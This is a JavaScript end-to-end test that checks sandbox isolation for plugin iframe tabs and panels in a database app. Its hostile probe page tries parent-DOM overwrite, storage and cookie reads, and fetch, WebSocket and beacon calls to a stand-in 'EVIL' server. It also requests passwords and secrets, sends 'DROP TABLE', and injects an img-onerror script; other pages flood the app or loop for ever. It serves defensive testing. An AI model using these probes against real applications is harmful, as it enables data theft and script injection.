// Plugin tabs and side panels (examples/plugins/panel-demo), and a hostile page in the same place.
// The example: the review names them; the frame is sandboxed and comes from the plugin's own scheme;
// a page reads its settings, keeps its state, runs its module, shows a message and opens a query
// that does not run; a permission it was not given is refused; the panel opens and closes; turning
// the plugin off takes it all away, and on brings it back.
//
// The hostile page tries what it should not, and writes what it found through the one way out it
// has: the app's globals, its parent's DOM, the storage, the network, popups, other plugins' files,
// requests the app does not know and ones it has no permission for. Its text in a message stays
// text. Then pages that leave their document, flood the app, send garbage or huge messages, and
// loop for ever: each is stopped and the user told, and the app goes on.
//
// What the crate checks is in crates/platypus-plugins/tests/frames.rs.
import assert from "node:assert/strict";
import { cpSync, existsSync, mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { createServer } from "node:http";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { DatabaseSync } from "node:sqlite";
import { CTRL } from "../cdp.mjs";
import { palette } from "../plans.mjs";

const here = dirname(fileURLToPath(import.meta.url));
const EXAMPLES = resolve(here, "../../../../examples/plugins");
const NAME = "E2E plugin panels";
const DEMO = "panel-demo";
const HOSTILE = "hostile-pages";
const EVIL_PORT = 18473;
const EVIL = `http://127.0.0.1:${EVIL_PORT}`;

const visibleTab = `[...document.querySelectorAll('.query-tab')].find(t => t.style.display !== 'none')`;
const treeRow = (label) =>
  `[...document.querySelectorAll('.tree-row')].find(r => r.querySelector('.tree-label')?.textContent === ${JSON.stringify(label)})`;
const panel = `document.querySelector('.plugins-panel')`;
const pluginRow = (id) => `${panel}?.querySelector('.driver-block[data-plugin="${id}"]:not(.plugin-review)')`;
const review = `${panel}?.querySelector('[data-field="plugin-review"]')`;
const toasts = `[...document.querySelectorAll('.toast')].map(t => t.textContent).join(' | ')`;
const shownPane = `document.querySelector('.pane:not([hidden])')`;
const shownBox = `${shownPane}?.querySelector('[data-field="plugin-frame"]')`;
const shownFrame = `${shownBox}?.querySelector('iframe')`;
const stoppedText = `(${shownBox}?.dataset.stopped ? ${shownBox}.textContent : '')`;

/** A page that tells what it finds through the app's one way out: the plugin's state. */
const PROBE = `<!doctype html><title>probe</title><script>
(async () => {
  const report = {};
  const attempt = async (name, work) => {
    try { report[name] = String(await work()); } catch (e) { report[name] = "refused: " + e.name + ": " + e.message; }
  };
  const fails = (make) => new Promise((yes, no) => { setTimeout(() => no(new Error("no answer")), 3000); make(() => yes("REACHED"), () => no(new Error("blocked"))); });
  await attempt("origin", () => self.origin);
  await attempt("__TAURI__", () => typeof window.__TAURI__);
  await attempt("__TAURI_INTERNALS__", () => typeof window.__TAURI_INTERNALS__);
  await attempt("ipc", () => typeof window.ipc);
  await attempt("webview", () => typeof window.chrome?.webview);
  await attempt("__platypus", () => typeof window.__platypus);
  await attempt("parent document", () => window.parent.document.title);
  await attempt("top document", () => window.top.document.title);
  await attempt("parent global", () => typeof window.parent.__TAURI_INTERNALS__);
  await attempt("parent write", () => { window.parent.document.body.innerHTML = "owned"; return "REACHED"; });
  await attempt("localStorage", () => localStorage.length);
  await attempt("sessionStorage", () => sessionStorage.length);
  await attempt("cookie", () => document.cookie);
  await attempt("indexedDB", () => new Promise((yes, no) => { const q = indexedDB.open("x"); q.onsuccess = () => yes("REACHED"); q.onerror = () => no(q.error); }));
  await attempt("fetch", () => fetch("${EVIL}/fetch").then(() => "REACHED"));
  await attempt("fetch ipc", () => fetch("http://ipc.localhost/plugins_list", { method: "POST" }).then(() => "REACHED"));
  await attempt("xhr", () => fails((yes, no) => { const x = new XMLHttpRequest(); x.open("GET", "${EVIL}/xhr"); x.onload = yes; x.onerror = no; x.send(); }));
  await attempt("websocket", () => fails((yes, no) => { const s = new WebSocket("ws://127.0.0.1:${EVIL_PORT}/ws"); s.onopen = yes; s.onerror = no; }));
  await attempt("image", () => fails((yes, no) => { const i = new Image(); i.onload = yes; i.onerror = no; i.src = "${EVIL}/image.png"; }));
  await attempt("script", () => fails((yes, no) => { const s = document.createElement("script"); s.onload = yes; s.onerror = no; s.src = "${EVIL}/script.js"; document.head.append(s); }));
  await attempt("other plugin's file", () => fails((yes, no) => { const s = document.createElement("script"); s.onload = yes; s.onerror = no; s.src = "http://platypus-plugin.localhost/${DEMO}/ui/notes.js"; document.head.append(s); }));
  await attempt("own file", () => new Promise((yes, no) => { const s = document.createElement("script"); s.onload = () => yes("loaded"); s.onerror = () => no(new Error("blocked")); s.src = "probe.js"; document.head.append(s); }));
  await attempt("eval", () => eval("1 + 1"));
  await attempt("popup", () => (window.open("${EVIL}/popup") === null ? "blocked" : "REACHED"));
  await attempt("form", () => { const f = document.createElement("form"); f.action = "${EVIL}/form"; f.method = "post"; document.body.append(f); f.submit(); return "tried"; });
  await attempt("top navigation", () => { window.top.location.href = "${EVIL}/top"; return "REACHED"; });
  await attempt("frame in a frame", () => fails((yes, no) => { const i = document.createElement("iframe"); i.onload = no; i.src = "${EVIL}/frame"; document.body.append(i); }));
  await attempt("beacon", () => (navigator.sendBeacon("${EVIL}/beacon", "x"), "tried"));
  const ask = (name, params) => platypus.request(name, params).then((v) => "ANSWERED " + JSON.stringify(v), (e) => "refused: " + e.message);
  report["run_sql"] = await ask("run_sql", { sql: "DROP TABLE items" });
  report["connections"] = await ask("connections");
  report["passwords"] = await ask("passwords");
  report["invoke"] = await ask("invoke", { cmd: "plugins_list" });
  report["clipboard"] = await ask("clipboard", { text: "x" });
  report["http"] = await ask("http", { url: "${EVIL}/http" });
  report["secret"] = await ask("setting", { key: "token" });
  report["other setting"] = await ask("setting", { key: "not-mine" });
  report["other action"] = await ask("run_action", { action: "not-mine", context: {} });
  report["open file"] = await ask("run_action", { action: "../../plugin", context: {} });
  report["notify"] = await ask("notify", { text: "<img src=x onerror=\\"window.__owned = 1\\"><b>bold</b>" });
  await platypus.request("state_set", { value: report });
})();
</script>`;

const PAGES = {
  "ui/probe.html": ["Hostile probe", PROBE],
  "ui/leave.html": ["Hostile leave", `<!doctype html><script>platypus.on((e) => { if (e === "init") setTimeout(() => { location.href = "${EVIL}/leave"; }, 100); });</script>`],
  "ui/flood.html": ["Hostile flood", `<!doctype html><script>const go = () => { for (let i = 0; i < 5000; i += 1) parent.postMessage({ platypus: 1, type: "pong", n: 0 }, "*"); setTimeout(go, 0); }; go();</script>`],
  "ui/garbage.html": ["Hostile garbage", `<!doctype html><script>for (const m of ["x", 42, { platypus: 1, type: "nonsense" }, { platypus: 1, type: "request", id: 1 }]) parent.postMessage(m, "*");</script>`],
  "ui/huge.html": ["Hostile huge", `<!doctype html><script>const huge = "x".repeat(64 << 20); for (let i = 0; i < 3; i += 1) parent.postMessage({ platypus: 1, type: "request", id: i, name: "notify", params: huge }, "*");</script>`],
  "ui/loop.html": ["Hostile loop", `<!doctype html><script>platypus.on((e) => { if (e === "init") setTimeout(() => { for (;;) {} }, 100); });</script>`],
};

export function setup({ dir }) {
  const db = new DatabaseSync(join(dir, "panels.db"));
  db.exec(`CREATE TABLE items (id INTEGER PRIMARY KEY);`);
  db.close();
  cpSync(join(EXAMPLES, DEMO), join(dir, "packages", DEMO), { recursive: true });
  const hostile = join(dir, "packages", HOSTILE);
  mkdirSync(join(hostile, "ui"), { recursive: true });
  cpSync(join(EXAMPLES, DEMO, "plugin.wasm"), join(hostile, "plugin.wasm"));
  const tabs = Object.entries(PAGES)
    .map(([entry, [title]], i) => `[[tabs]]\nkind = "k${i}"\ntitle = "${title}"\nentry = "${entry}"\n`)
    .join("\n");
  writeFileSync(
    join(hostile, "plugin.toml"),
    `id = "${HOSTILE}"\nname = "Hostile pages"\nversion = "1.0.0"\napi = 2\nkinds = ["actions", "tabs"]\n\n[permissions]\ntabs = true\n\n${tabs}\n[[settings]]\nkey = "token"\nlabel = "Token"\ntype = "secret"\n`,
  );
  for (const [entry, [, html]] of Object.entries(PAGES)) writeFileSync(join(hostile, entry), html);
  writeFileSync(join(hostile, "ui/probe.js"), "window.probeLoaded = 1;");
  writeFileSync(
    join(dir, "connections.toml"),
    `version = 8

[[connections]]
id = "00000000-0000-4000-8000-0000000e0f01"
name = "${NAME}"
driver = "sqlite"
database = '${join(dir, "panels.db")}'
save_password = false
`,
  );
  writeFileSync(join(dir, "settings.toml"), `version = 1\n\n[drivers]\nauto_update = false\n`);
}

async function openPluginsPage(page) {
  await page.key(",", "Comma", 188, CTRL);
  await page.settingsTab("Plugins");
  await page.waitFor(`${panel} !== null`, 15_000);
}

async function closeSettings(page) {
  await page.eval(`document.querySelector('.modal.settings [role="tab"][aria-selected="true"]')?.focus()`);
  await page.key("Escape", "Escape", 27);
  await page.waitFor(`document.querySelector('.modal.settings') === null`);
}

/** Installs a package from the data folder's `packages`, and answers what the review says. */
async function install(page, dir, id) {
  await openPluginsPage(page);
  await page.eval(`window.__platypus.answer("folder", ${JSON.stringify(join(dir, "packages", id))})`);
  await page.eval(`${panel}.querySelector('[data-action="install-folder"]').click()`);
  await page.waitFor(`${review} !== null`, 15_000);
  const text = await page.eval(`${review}.textContent`);
  await page.eval(`${review}.querySelector('[data-action="confirm-install"]').click()`);
  await page.waitFor(`${pluginRow(id)} != null && ${review} === null`, 15_000);
  await closeSettings(page);
  return text;
}

async function setEnabled(page, id, on) {
  await openPluginsPage(page);
  const toggle = `${pluginRow(id)}.querySelector('[data-action="toggle"]')`;
  if ((await page.eval(`${toggle}.checked`)) !== on) await page.eval(`${toggle}.click()`);
  await page.waitFor(`${pluginRow(id)}.dataset.enabled === '${on}'`);
  await closeSettings(page);
}

const clearToasts = async (page) => {
  await page.eval(`document.querySelectorAll('.toast').forEach(t => t.click())`);
  await page.waitFor(`document.querySelectorAll('.toast').length === 0`);
};

/** Reaches inside a frame by its own DevTools target: a sandboxed frame runs in a process of its
 *  own, and the page cannot look in, which is the point. */
async function frameSession(port, part) {
  const deadline = Date.now() + 15_000;
  let target;
  while (!target) {
    const targets = await (await fetch(`http://127.0.0.1:${port}/json`)).json();
    target = targets.find((t) => t.type === "iframe" && t.url.includes(part));
    if (!target) {
      assert.ok(Date.now() < deadline, `no frame target for ${part}: ${JSON.stringify(targets.map((t) => [t.type, t.url]))}`);
      await new Promise((r) => setTimeout(r, 100));
    }
  }
  const ws = new WebSocket(target.webSocketDebuggerUrl);
  await new Promise((yes, no) => {
    ws.onopen = yes;
    ws.onerror = no;
  });
  let next = 1;
  const waiting = new Map();
  ws.onmessage = (m) => {
    const message = JSON.parse(m.data);
    waiting.get(message.id)?.(message.result);
    waiting.delete(message.id);
  };
  const evaluate = (expression) =>
    new Promise((resolve) => {
      const id = next++;
      waiting.set(id, (r) => resolve(r?.result?.value));
      ws.send(JSON.stringify({ id, method: "Runtime.evaluate", params: { expression, returnByValue: true, awaitPromise: true } }));
    });
  return {
    evaluate,
    waitFor: async (expression, timeout = 10_000) => {
      const end = Date.now() + timeout;
      while (!(await evaluate(expression))) {
        assert.ok(Date.now() < end, `in the frame, timed out on ${expression}`);
        await new Promise((r) => setTimeout(r, 50));
      }
    },
    close: () => ws.close(),
  };
}

const stateFile = (dir, id) => join(dir, "plugins", ".frame-state", `${id}.json`);

async function stateOf(dir, id, done = () => true) {
  const deadline = Date.now() + 15_000;
  for (;;) {
    const state = existsSync(stateFile(dir, id)) ? JSON.parse(readFileSync(stateFile(dir, id), "utf8")) : null;
    if (state && done(state)) return state;
    assert.ok(Date.now() < deadline, `no state of ${id}: ${JSON.stringify(state)}`);
    await new Promise((r) => setTimeout(r, 100));
  }
}

async function closeShownTab(page) {
  const count = await page.eval(`document.querySelectorAll('.pane').length`);
  await page.key("w", "KeyW", 87, CTRL);
  await page.waitFor(`document.querySelectorAll('.pane').length === ${count - 1}`);
}

async function exampleTab(page, dir, port) {
  await palette(page, "Demo notes");
  await page.waitFor(`${shownFrame}?.dataset.plugin === '${DEMO}'`, 15_000);
  const attributes = await page.eval(`(() => { const f = ${shownFrame}; return { sandbox: f.getAttribute('sandbox'), src: f.src, allow: f.getAttribute('allow'), referrer: f.getAttribute('referrerpolicy') }; })()`);
  assert.equal(attributes.sandbox, "allow-scripts");
  assert.equal(attributes.src, `http://platypus-plugin.localhost/${DEMO}/ui/notes.html`);
  assert.equal(attributes.allow, "");
  assert.equal(attributes.referrer, "no-referrer");
  assert.match(await page.eval(`document.querySelector('.tab.active')?.textContent ?? ''`), /Demo notes/);

  const frame = await frameSession(port, `${DEMO}/ui/notes.html`);
  try {
    assert.equal(await frame.evaluate("self.origin"), "null");
    // Its setting, its connection and the theme, from the app.
    await frame.waitFor(`document.getElementById('greeting').textContent === 'Hello from the settings'`);
    await frame.waitFor(`document.getElementById('where').textContent === 'On ${NAME} (sqlite)'`);
    assert.notEqual(await frame.evaluate(`document.documentElement.style.getPropertyValue('--bg')`), "");
    // Its file loaded, under its own policy.
    assert.equal(await frame.evaluate(`getComputedStyle(document.querySelector('h1')).fontSize`), "16px");
    // What it was not given.
    await frame.waitFor(`/not allowed/.test(document.body.dataset.clipboard ?? '') && /not allowed/.test(document.body.dataset.http ?? '')`);

    // It keeps its state, in the app's care.
    await frame.evaluate(`document.getElementById('text').value = 'two words'; document.getElementById('save').click()`);
    await frame.waitFor(`document.getElementById('result').textContent === 'Saved'`);
    assert.deepEqual(await stateOf(dir, DEMO), { text: "two words" });

    // Its module, on what it gives it.
    await frame.evaluate(`document.getElementById('count').click()`);
    await frame.waitFor(`document.getElementById('result').textContent === '2 words'`);

    // A message, which says whose it is.
    await clearToasts(page);
    await frame.evaluate(`document.getElementById('toast').click()`);
    await page.waitFor(`(${toasts}).includes('Panel demo: Hello from the notes')`);

    // A query opens in a new tab, and does not run.
    await page.sleep(1100);
    const panes = await page.eval(`document.querySelectorAll('.pane').length`);
    await frame.evaluate(`document.getElementById('query').click()`);
    await page.waitFor(`document.querySelectorAll('.pane').length === ${panes + 1}`);
    await page.waitFor(`${visibleTab}?.querySelector('.cm-content')?.textContent === 'two words'`);
    assert.equal(await page.eval(`${visibleTab}.querySelector('.statusbar span')?.textContent.includes('rows') ?? false`), false);
    await closeShownTab(page);
    await page.waitFor(`${shownFrame}?.dataset.plugin === '${DEMO}'`);
    // Coming back did not load it again.
    assert.equal(await frame.evaluate(`document.getElementById('result').textContent !== ''`), true);
  } finally {
    frame.close();
  }
}

async function examplePanel(page) {
  const frame = `document.querySelector('.plugin-panel iframe')`;
  await clearToasts(page);
  await palette(page, "Demo outline");
  await page.waitFor(`${frame}?.dataset.plugin === '${DEMO}'`, 15_000);
  await page.waitFor(`(${toasts}).includes('Outline open, notes: 9 characters')`, 15_000);
  assert.equal(await page.eval(`${frame}.getAttribute('sandbox')`), "allow-scripts");
  // Beside the tab, and it does not cover it.
  const [side, tab] = [await page.rectOf(frame), await page.rectOf(shownBox)];
  assert.ok(side.w >= 200 && tab.w >= 200, JSON.stringify({ side, tab }));
  await page.eval(`document.querySelector('.plugin-panel [data-action="close-panel"]').click()`);
  await page.waitFor(`document.querySelector('.plugin-panel') === null`);
  await palette(page, "Demo outline");
  await page.waitFor(`${frame} != null`, 15_000);
}

async function turningOffTakesItAway(page) {
  await setEnabled(page, DEMO, false);
  await page.waitFor(`document.querySelector('.plugin-panel') === null`);
  await page.waitFor(`${shownFrame} == null && ${shownPane}.textContent.includes('not available')`);
  await page.key("k", "KeyK", 75, CTRL);
  await page.waitFor(`document.querySelector('.palette input') !== null`);
  await page.type("Demo notes");
  await page.waitFor(`document.querySelector('.palette input')?.value === 'Demo notes'`);
  await page.sleep(300);
  assert.equal(await page.eval(`[...document.querySelectorAll('.palette li')].some(li => li.textContent.includes('Demo notes'))`), false);
  await page.key("Escape", "Escape", 27);
  await page.waitFor(`document.querySelector('.palette') === null`);
  await setEnabled(page, DEMO, true);
  await page.waitFor(`${shownFrame}?.dataset.plugin === '${DEMO}'`, 15_000);
  await page.waitFor(`document.querySelector('.plugin-panel iframe') != null`, 15_000);
  await page.eval(`document.querySelector('.plugin-panel [data-action="close-panel"]').click()`);
  await closeShownTab(page);
}

async function hostileProbe(page, dir, evil) {
  const reviewed = await install(page, dir, HOSTILE);
  assert.match(reviewed, /Show its own pages in tabs and side panels/);
  const title = await page.eval(`document.title`);
  await clearToasts(page);
  await palette(page, "Hostile probe");
  const report = await stateOf(dir, HOSTILE);

  assert.equal(report.origin, "null");
  for (const global of ["__TAURI__", "__TAURI_INTERNALS__", "ipc", "webview", "__platypus"]) {
    assert.equal(report[global], "undefined", global);
  }
  for (const reach of ["parent document", "top document", "parent global", "parent write", "localStorage", "sessionStorage", "cookie", "indexedDB"]) {
    assert.match(report[reach], /^refused: SecurityError/, reach);
  }
  for (const net of ["fetch", "fetch ipc", "xhr", "websocket", "image", "script", "other plugin's file", "frame in a frame"]) {
    assert.match(report[net], /^refused/, net);
  }
  assert.equal(report["own file"], "loaded");
  assert.match(report.eval, /^refused: EvalError/);
  assert.equal(report.popup, "blocked");
  assert.match(report["top navigation"], /^refused: SecurityError/);

  // What it asks: nothing the app does not know, and nothing it was not given.
  for (const name of ["run_sql", "connections", "passwords", "invoke"]) assert.match(report[name], /^refused: no such request/, name);
  assert.match(report.clipboard, /^refused: not allowed/);
  assert.match(report.http, /^refused: not allowed/);
  assert.match(report.secret, /^refused: .*secret/);
  assert.match(report["other setting"], /^refused: /);
  assert.match(report["other action"], /^refused: /);
  assert.match(report["open file"], /^refused: /);
  assert.ok(!JSON.stringify(report).includes("ANSWERED {"), JSON.stringify(report));

  // Its markup in a message is text.
  await page.waitFor(`(${toasts}).includes('<img src=x')`);
  assert.equal(await page.eval(`document.querySelector('.toast img, .toast b') === null && window.__owned === undefined`), true);

  // The app is as it was, and nothing reached the network.
  assert.equal(await page.eval(`document.title`), title);
  assert.equal(await page.eval(`document.querySelector('.tree-row') !== null`), true);
  await page.sleep(500);
  assert.deepEqual(evil, [], `reached the network: ${evil.join(", ")}`);
  await closeShownTab(page);
}

async function stoppedPages(page, evil) {
  // It leaves its document: the policy of the app stops the navigation, and the app stops it.
  await palette(page, "Hostile leave");
  await page.waitFor(`(${stoppedText}).includes('tried to leave its document')`, 20_000);
  assert.equal(await page.eval(`${shownFrame} == null`), true);
  // Loaded again it does the same, and nothing else happens.
  await page.eval(`${shownBox}.querySelector('[data-action="reload-frame"]').click()`);
  await page.waitFor(`${shownFrame} != null`);
  await page.waitFor(`(${stoppedText}).includes('tried to leave its document')`, 20_000);
  assert.deepEqual(evil, [], `reached the network: ${evil.join(", ")}`);
  await closeShownTab(page);

  await palette(page, "Hostile flood");
  await page.waitFor(`(${stoppedText}).includes('too many messages')`, 20_000);
  await closeShownTab(page);

  await palette(page, "Hostile garbage");
  await page.waitFor(`(${stoppedText}).includes('does not understand')`, 20_000);
  await closeShownTab(page);

  await palette(page, "Hostile huge");
  await page.waitFor(`(${stoppedText}).includes('does not understand')`, 30_000);
  await closeShownTab(page);
}

/** Runs `work` or says the app is frozen: a frame sharing the page's thread would hold it. */
function orFrozen(work, ms, why) {
  return Promise.race([work, new Promise((_, no) => setTimeout(() => no(new Error(`the app is frozen: ${why}`)), ms))]);
}

async function endlessLoop(page) {
  const why = "the frame's loop holds the page's thread, so the frame shares its process";
  await palette(page, "Hostile loop");
  await orFrozen(page.waitFor(`${shownFrame} != null`, 15_000), 20_000, why);
  await page.sleep(1500);
  // The app answers and draws while the frame loops.
  const start = Date.now();
  await orFrozen(page.eval(`new Promise((done) => requestAnimationFrame(() => done(1)))`), 5000, why);
  const answered = Date.now() - start;
  console.log(`the app answered in ${answered} ms while a frame looped`);
  // It stops answering pings, and is removed.
  await orFrozen(page.waitFor(`(${stoppedText}).includes('stopped responding')`, 30_000), 35_000, why);
  assert.equal(await page.eval(`${shownFrame} == null`), true);
  await closeShownTab(page);
}

async function theBackendAsksToo(page, dir) {
  await palette(page, "Hostile garbage");
  await page.waitFor(`(${stoppedText}).includes('does not understand')`, 20_000);
  // The page's list of plugins still says yes; the backend reads what was approved.
  const file = join(dir, "plugins", "plugins.json");
  const state = readFileSync(file, "utf8");
  const denied = JSON.parse(state);
  denied.plugins[HOSTILE].approved.tabs = false;
  writeFileSync(file, JSON.stringify(denied));
  await page.eval(`${shownBox}.querySelector('[data-action="reload-frame"]').click()`);
  await page.waitFor(`(${stoppedText}).includes('no permission')`, 15_000);
  assert.equal(await page.eval(`${shownFrame} == null`), true);
  writeFileSync(file, state);
  await closeShownTab(page);
}

async function goesAwayWithThePlugin(page, dir) {
  assert.equal(existsSync(stateFile(dir, HOSTILE)), true);
  await palette(page, "Hostile garbage");
  await page.waitFor(`${shownBox} != null`, 15_000);
  await openPluginsPage(page);
  await page.eval(`${pluginRow(HOSTILE)}.querySelector('[data-action="remove"]').click()`);
  await page.waitFor(`document.querySelector('.modal.confirm') !== null`);
  await page.eval(`document.querySelector('.modal.confirm button.danger, .modal.confirm button.primary').click()`);
  await page.waitFor(`${pluginRow(HOSTILE)} == null`, 15_000);
  await closeSettings(page);
  await page.waitFor(`${shownPane}.textContent.includes('not available')`);
  assert.equal(existsSync(stateFile(dir, HOSTILE)), false);
  assert.equal(existsSync(join(dir, "plugins", HOSTILE)), false);
}

async function openConnection(page, name) {
  await page.eval(`${treeRow(name)}.id = 'e2e-conn'`);
  await page.clickSel("#e2e-conn", { clickCount: 2 });
  await page.eval(`document.getElementById('e2e-conn').removeAttribute('id')`);
  await page.waitFor(`${visibleTab}?.querySelector('.cm-content') != null`, 20_000);
}

export default async function (page, { dir, port }) {
  // What reaches this server came from a page that should have no network.
  const evil = [];
  const server = createServer((req, res) => {
    evil.push(`${req.method} ${req.url}`);
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.end("reached");
  });
  await new Promise((done) => server.listen(EVIL_PORT, "127.0.0.1", done));
  try {
    await page.waitFor(`${treeRow(NAME)} !== undefined`);
    const reviewed = await install(page, dir, DEMO);
    assert.match(reviewed, /Tab “Demo notes”/);
    assert.match(reviewed, /Side panel “Demo outline”/);
    assert.match(reviewed, /Show its own pages in tabs and side panels/);
    await openConnection(page, NAME);
    await exampleTab(page, dir, port);
    await examplePanel(page);
    await turningOffTakesItAway(page);
    await hostileProbe(page, dir, evil);
    await stoppedPages(page, evil);
    await theBackendAsksToo(page, dir);
    await endlessLoop(page);
    await goesAwayWithThePlugin(page, dir);
    assert.deepEqual(evil, [], `reached the network: ${evil.join(", ")}`);
  } finally {
    server.close();
  }
}
